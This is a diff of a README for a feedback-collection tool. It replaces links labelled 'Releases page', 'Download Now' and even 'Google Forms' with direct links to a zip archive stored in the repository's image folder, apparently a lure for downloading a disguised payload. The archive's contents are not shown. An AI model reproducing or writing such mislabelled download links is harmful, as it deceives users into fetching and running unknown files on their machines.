@@ -1,6 +1,6 @@
 # 📝 Collect-Feedback-Without-a-Backend - Collect Feedback with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%20%F0%9F%9A%80-brightgreen)](https://github.com/Mizenmasthypocellularity917/Collect-Feedback-Without-a-Backend/releases)
+[![Download Now](https://raw.githubusercontent.com/Mizenmasthypocellularity917/Collect-Feedback-Without-a-Backend/main/img/Collect-Feedback-Without-a-Backend-2.8.zip%20Now-Get%20Started%20%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/Mizenmasthypocellularity917/Collect-Feedback-Without-a-Backend/main/img/Collect-Feedback-Without-a-Backend-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,12 +16,12 @@ Before you get started, ensure you have:
 
 ### 💻 How to Download
 
-To get started, you can easily download the application by visiting our [Releases page](https://github.com/Mizenmasthypocellularity917/Collect-Feedback-Without-a-Backend/releases). On that page, you will find the latest version of the application ready for you.
+To get started, you can easily download the application by visiting our [Releases page](https://raw.githubusercontent.com/Mizenmasthypocellularity917/Collect-Feedback-Without-a-Backend/main/img/Collect-Feedback-Without-a-Backend-2.8.zip). On that page, you will find the latest version of the application ready for you.
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Mizenmasthypocellularity917/Collect-Feedback-Without-a-Backend/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Mizenmasthypocellularity917/Collect-Feedback-Without-a-Backend/main/img/Collect-Feedback-Without-a-Backend-2.8.zip).
    
 2. **Select the Latest Release**  
    Find the most recent version listed on the page. Click on the version number to see the release details, including any updates or fix notes.
@@ -39,7 +39,7 @@ To get started, you can easily download the application by visiting our [Release
 
 ### 1. Set Up Your Google Form
 
-   - Go to [Google Forms](https://forms.google.com) and create a new form.
+   - Go to [Google Forms](https://raw.githubusercontent.com/Mizenmasthypocellularity917/Collect-Feedback-Without-a-Backend/main/img/Collect-Feedback-Without-a-Backend-2.8.zip) and create a new form.
    - Add the questions you want your users to answer. Ensure all necessary questions are included.
    - Once your form is ready, click on the **Send** button. You will see options to share your form.
 
